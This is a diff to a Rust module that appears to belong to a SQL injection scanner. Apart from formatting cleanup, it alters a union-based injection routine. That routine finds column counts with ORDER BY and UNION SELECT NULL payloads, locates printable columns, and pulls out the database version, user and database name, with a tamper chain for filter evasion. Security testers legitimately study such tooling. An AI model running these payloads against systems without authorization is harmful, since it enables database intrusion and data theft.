@@ -7,8 +7,10 @@ use tracing::{debug, info, warn};
 use crate::sqx::{
     detector::SqliDetector,
     evasion::tamper_chain::TamperChain,
-    models::{HttpResponse, SqliTestResult, SqliTechnique, UnionExtractedData},
-    similarity::{calculate_similarity, detect_php_error, detect_sql_error, extract_value_from_response},
+    models::{HttpResponse, SqliTechnique, SqliTestResult, UnionExtractedData},
+    similarity::{
+        calculate_similarity, detect_php_error, detect_sql_error, extract_value_from_response,
+    },
 };
 
 impl SqliDetector {
@@ -25,29 +27,40 @@ impl SqliDetector {
         debug!("Testing union-based SQL injection on parameter: {}", param);
 
         // === PHASE 1: Column Count Discovery ===
-        let column_count = self.discover_column_count_with_bypass(url, param, original_value, tamper).await?;
-        if column_count == 0 { return None; }
+        let column_count = self
+            .discover_column_count_with_bypass(url, param, original_value, tamper)
+            .await?;
+        if column_count == 0 {
+            return None;
+        }
 
         // === PHASE 2: Printable Column Detection ===
         let printable_columns = self
             .detect_printable_columns_with_bypass(
-                url, param, original_value, column_count, baseline, tamper,
+                url,
+                param,
+                original_value,
+                column_count,
+                baseline,
+                tamper,
             )
             .await;
 
         if printable_columns.is_empty() {
-            debug!("No printable columns detected");
+            debug!("No printable columns detected - not a valid UNION injection");
+            return None;
         }
 
         // === PHASE 3: Data Extraction ===
-        let extracted_data = if !printable_columns.is_empty() {
-            self.extract_union_data_with_bypass(
-                url, param, original_value, column_count, &printable_columns, tamper,
-            )
-            .await
-        } else {
-            None
-        };
+        let extracted_data = self.extract_union_data_with_bypass(
+            url,
+            param,
+            original_value,
+            column_count,
+            &printable_columns,
+            tamper,
+        )
+        .await;
 
         let evidence = if let Some(data) = &extracted_data {
             format!(
@@ -59,17 +72,11 @@ impl SqliDetector {
                 data.user.as_deref().unwrap_or("N/A"),
                 data.database.as_deref().unwrap_or("N/A")
             )
-        } else if !printable_columns.is_empty() {
+        } else {
             format!(
                 "Detected {} columns via ORDER BY. Printable columns: {:?}. \
                  Data extraction was attempted but not successful.",
                 column_count, printable_columns
-            )
-        } else {
-            format!(
-                "Detected {} columns via ORDER BY. Union SELECT successful but \
-                 printable columns could not be determined.",
-                column_count
             )
         };
 
@@ -116,28 +123,53 @@ impl SqliDetector {
 
             match self.send_request(&test_url).await {
                 Ok(response) => {
-                    if detect_php_error(&response.body) && detect_sql_error(&response.body).is_none() {
-                        debug!("PHP code injection detected for param={}, aborting union scan", param);
+                    if detect_php_error(&response.body)
+                        && detect_sql_error(&response.body).is_none()
+                    {
+                        debug!(
+                            "PHP code injection detected for param={}, aborting union scan",
+                            param
+                        );
                         return None;
                     }
                     if detect_sql_error(&response.body).is_some() {
                         if last_successful > 0 {
-                            let verify_payload = format!("{}' ORDER BY {}-- ", original_value, last_successful);
-                            let verify_url = self.build_test_url(url, param, original_value, &encode(&verify_payload));
+                            let verify_payload =
+                                format!("{}' ORDER BY {}-- ", original_value, last_successful);
+                            let verify_url = self.build_test_url(
+                                url,
+                                param,
+                                original_value,
+                                &encode(&verify_payload),
+                            );
                             match self.send_request(&verify_url).await {
-                                Ok(verify_resp) if detect_sql_error(&verify_resp.body).is_none() => {
-                                    debug!("ORDER BY {} succeeded, ORDER BY {} failed → {} columns",
-                                           last_successful, i, last_successful);
+                                Ok(verify_resp)
+                                    if detect_sql_error(&verify_resp.body).is_none() =>
+                                {
+                                    debug!(
+                                        "ORDER BY {} succeeded, ORDER BY {} failed → {} columns",
+                                        last_successful, i, last_successful
+                                    );
                                     return Some(last_successful);
                                 }
                                 _ => {}
                             }
                         }
-                        return if last_successful > 0 { Some(last_successful) } else { None };
+                        return if last_successful > 0 {
+                            Some(last_successful)
+                        } else {
+                            None
+                        };
                     }
                     last_successful = i;
                 }
-                Err(_) => return if last_successful > 0 { Some(last_successful) } else { None },
+                Err(_) => {
+                    return if last_successful > 0 {
+                        Some(last_successful)
+                    } else {
+                        None
+                    };
+                }
             }
             tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
         }
@@ -151,18 +183,25 @@ impl SqliDetector {
         for n in (1..=20usize).rev() {
             let nulls = (0..n).map(|_| "NULL").collect::<Vec<_>>().join(",");
             let union_payload = format!("{}' UNION SELECT {}-- ", original_value, nulls);
-            let test_url =
-                self.build_test_url(url, param, original_value, &encode(&union_payload));
+            let test_url = self.build_test_url(url, param, original_value, &encode(&union_payload));
 
             match self.send_request(&test_url).await {
                 Ok(response) => {
-                    if detect_php_error(&response.body) && detect_sql_error(&response.body).is_none() {
-                        debug!("PHP code injection in UNION fallback for param={}, aborting", param);
+                    if detect_php_error(&response.body)
+                        && detect_sql_error(&response.body).is_none()
+                    {
+                        debug!(
+                            "PHP code injection in UNION fallback for param={}, aborting",
+                            param
+                        );
                         return None;
                     }
                     let similarity = calculate_similarity(&baseline_body, &response.body);
                     if detect_sql_error(&response.body).is_none() && similarity < 0.95 {
-                        debug!("UNION SELECT confirmed column count: {} (similarity={:.2})", n, similarity);
+                        debug!(
+                            "UNION SELECT confirmed column count: {} (similarity={:.2})",
+                            n, similarity
+                        );
                         return Some(n);
                     }
                 }
@@ -199,7 +238,10 @@ impl SqliDetector {
         let null_payload = format!(
             "{}' UNION SELECT {}-- ",
             original_value,
-            (0..column_count).map(|_| "NULL").collect::<Vec<_>>().join(",")
+            (0..column_count)
+                .map(|_| "NULL")
+                .collect::<Vec<_>>()
+                .join(",")
         );
         let encoded_null = encode(&null_payload);
         let null_response = self
@@ -297,8 +339,14 @@ impl SqliDetector {
             debug!("Trying {} extraction functions", dialect.name());
             if let Some(extracted) = self
                 .try_extract_for_dbms_with_bypass(
-                    url, param, original_value, column_count, first_printable,
-                    &funcs, dialect.name(), tamper,
+                    url,
+                    param,
+                    original_value,
+                    column_count,
+                    first_printable,
+                    &funcs,
+                    dialect.name(),
+                    tamper,
                 )
                 .await
             {
@@ -337,8 +385,7 @@ impl SqliDetector {
             }
         };
 
-        let mut select_parts: Vec<String> =
-            (0..column_count).map(|_| "NULL".to_string()).collect();
+        let mut select_parts: Vec<String> = (0..column_count).map(|_| "NULL".to_string()).collect();
 
         // version
         select_parts[printable_col - 1] = functions[0].to_string();
@@ -348,16 +395,20 @@ impl SqliDetector {
             select_parts.join(",")
         );
         if let Ok(response) = self
-            .send_request(
-                &self.build_test_url(url, param, original_value, &encode(&version_payload)),
-            )
+            .send_request(&self.build_test_url(
+                url,
+                param,
+                original_value,
+                &encode(&version_payload),
+            ))
             .await
             && detect_sql_error(&response.body).is_none()
-                && let Some(version) = extract_value_from_response(&response.body) {
-                    data.version = Some(version);
-                    data.dbms_hint = Some(dbms_name.to_string());
-                    found_any = true;
-                }
+            && let Some(version) = extract_value_from_response(&response.body)
+        {
+            data.version = Some(version);
+            data.dbms_hint = Some(dbms_name.to_string());
+            found_any = true;
+        }
         tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
 
         // user
@@ -368,15 +419,14 @@ impl SqliDetector {
             select_parts.join(",")
         );
         if let Ok(response) = self
-            .send_request(
-                &self.build_test_url(url, param, original_value, &encode(&user_payload)),
-            )
+            .send_request(&self.build_test_url(url, param, original_value, &encode(&user_payload)))
             .await
             && detect_sql_error(&response.body).is_none()
-                && let Some(user) = extract_value_from_response(&response.body) {
-                    data.user = Some(user);
-                    found_any = true;
-                }
+            && let Some(user) = extract_value_from_response(&response.body)
+        {
+            data.user = Some(user);
+            found_any = true;
+        }
         tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
 
         // database
@@ -387,15 +437,14 @@ impl SqliDetector {
             select_parts.join(",")
         );
         if let Ok(response) = self
-            .send_request(
-                &self.build_test_url(url, param, original_value, &encode(&db_payload)),
-            )
+            .send_request(&self.build_test_url(url, param, original_value, &encode(&db_payload)))
             .await
             && detect_sql_error(&response.body).is_none()
-                && let Some(database) = extract_value_from_response(&response.body) {
-                    data.database = Some(database);
-                    found_any = true;
-                }
+            && let Some(database) = extract_value_from_response(&response.body)
+        {
+            data.database = Some(database);
+            found_any = true;
+        }
 
         if found_any { Some(data) } else { None }
     }
